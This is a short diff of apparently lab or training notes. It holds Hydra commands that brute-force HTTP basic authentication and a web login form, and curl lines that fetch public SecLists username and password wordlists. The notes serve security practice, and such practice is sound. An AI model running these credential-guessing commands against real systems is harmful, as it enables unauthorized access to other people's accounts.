@@ -2,3 +2,10 @@ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/
 ┌─[user@parrot]─[~]
 └──╼ $ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 94.237.56.113 http-get / -s 40753
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+
+# Download wordlists if needed
+curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
+ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
+# Hydra command
+hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
